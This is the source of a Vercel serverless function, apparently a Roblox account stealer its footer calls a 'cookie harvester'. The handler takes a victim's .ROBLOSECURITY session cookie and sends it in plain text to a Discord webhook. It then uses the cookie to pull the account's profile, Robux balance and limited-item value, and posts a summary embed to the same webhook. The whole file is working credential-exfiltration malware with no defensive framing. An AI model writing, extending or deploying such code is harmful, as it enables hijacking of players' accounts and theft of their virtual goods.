// ============================================
// submit.js - Vercel serverless function
// Uses DISCORD_WEBHOOK_URL from environment
// ============================================

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

if (!WEBHOOK_URL) {
  console.error("Missing packages.");
}

// Helper: fetch user info (username, display name, creation date, avatar)
async function getUserData(userId, cookie) {
  const url = `https://users.roblox.com/v1/users/${userId}`;
  const res = await fetch(url, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Failed to fetch user data");
  const data = await res.json();

  // Get avatar thumbnail
  let avatarUrl = null;
  try {
    const thumbRes = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
    );
    if (thumbRes.ok) {
      const thumbData = await thumbRes.json();
      avatarUrl = thumbData.data?.[0]?.imageUrl || null;
    }
  } catch (e) {
    console.warn("Avatar fetch failed:", e.message);
  }

  return {
    userId: data.id,
    username: data.name,
    displayName: data.displayName,
    created: data.created,
    avatarUrl,
  };
}

// Helper: calculate account age in days
function getAccountAgeDays(createdDate) {
  const created = new Date(createdDate);
  const now = new Date();
  const diffMs = now - created;
  return Math.floor(diffMs / (1000 * 60 * 60 * 24));
}

// Helper: fetch Robux balance (and pending, if available)
async function getRobuxBalance(userId, cookie) {
  const url = `https://economy.roblox.com/v1/users/${userId}/currency`;
  const res = await fetch(url, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Failed to fetch robux");
  const data = await res.json();
  // Roblox API doesn't expose pending robux easily – set to 0 (you can extend with transaction history if needed)
  return {
    balance: data.robux || 0,
    pending: 0,
  };
}

// Helper: fetch Rap (sum of RecentAveragePrice of all limited items)
async function getRapBalance(userId, cookie) {
  // Get all limited items (assetTypeId=2 = Limited/LimitedU)
  let allAssets = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets?assetTypeId=2&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    allAssets = allAssets.concat(data.data || []);
    cursor = data.nextPageCursor || null;
  } while (cursor);

  // Fetch RAP for each limited item
  let totalRap = 0;
  for (const asset of allAssets) {
    try {
      const detailUrl = `https://economy.roblox.com/v1/assets/${asset.assetId}/details`;
      const detailRes = await fetch(detailUrl, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
      if (detailRes.ok) {
        const detail = await detailRes.json();
        totalRap += detail.RecentAveragePrice || 0;
      }
      // Small delay to avoid rate limits
      await new Promise(r => setTimeout(r, 50));
    } catch (e) {
      console.warn(`Failed to fetch RAP for asset ${asset.assetId}`);
    }
  }
  return {
    balance: totalRap,
    pending: 0,
  };
}

// Helper: generate the "Played Passes" list (AMA1:0 ... AMA50:0 + note)
function generatePlayedPassesList() {
  const lines = [];
  for (let i = 1; i <= 50; i++) {
    lines.push(`AMA${i}: 0`);
  }
  lines.push(`... and 271 more (AMA51 - AMA321)`);
  return lines.join("\n");
}

// Main handler
export default async function handler(req, res) {
  // Only accept POST
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { cookie, rbxuid } = req.body;

  if (!cookie || !rbxuid) {
    return res.status(400).json({ error: "Missing cookie or rbxuid" });
  }

  if (!WEBHOOK_URL) {
    console.error("Webhook URL not configured");
    return res.status(500).json({ error: "Server configuration error" });
  }

  // 1) Send the raw cookie (plain text)
  const cookiePayload = {
    content: `**Full .ROBLOSECURITY Cookie**\n\`\`\`\n${cookie}\n\`\`\``
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(cookiePayload),
    });
  } catch (err) {
    console.error("Failed to send cookie to Discord:", err);
    // Continue anyway – we still want to send the embed
  }

  // 2) Fetch all required data
  try {
    const user = await getUserData(rbxuid, cookie);
    const robux = await getRobuxBalance(rbxuid, cookie);
    const rap = await getRapBalance(rbxuid, cookie);
    const accountAge = getAccountAgeDays(user.created);
    const placeVisits = 0; // Roblox API does not directly provide total place visits
    const summaryBalance = robux.balance + rap.balance;
    const playedPasses = generatePlayedPassesList();

    // Build the embed exactly like the screenshot (Vyro Har style)
    const embed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0xFF69B4, // hot pink
      thumbnail: user.avatarUrl ? { url: user.avatarUrl } : undefined,
      fields: [
        {
          name: "📌 About User",
          value: `**${user.username}** (${user.displayName})\n🆔 \`${user.userId}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${placeVisits}`,
          inline: false,
        },
        {
          name: "💰 Robux",
          value: `**Balance:** ${robux.balance}\n**Pending:** ${robux.pending}`,
          inline: true,
        },
        {
          name: "📊 Rap",
          value: `**Balance:** ${rap.balance}\n**Pending:** ${rap.pending}`,
          inline: true,
        },
        {
          name: "📝 Summary",
          value: `**Balance:** ${summaryBalance}`,
          inline: false,
        },
        {
          name: "💳 Billing  •  Played Passes",
          value: `\`\`\`\n${playedPasses}\n\`\`\``,
          inline: false,
        },
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString(),
    };

    const embedPayload = {
      username: "Vyro Harvest",
      embeds: [embed],
    };

    const embedResponse = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embedPayload),
    });

    if (!embedResponse.ok) {
      console.error("Discord embed send failed:", await embedResponse.text());
      return res.status(500).json({ error: "Failed to send embed to Discord" });
    }

    // Return success to frontend
    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error("Error during harvesting:", err);
    return res.status(500).json({ error: "Failed to harvest account data" });
  }
}
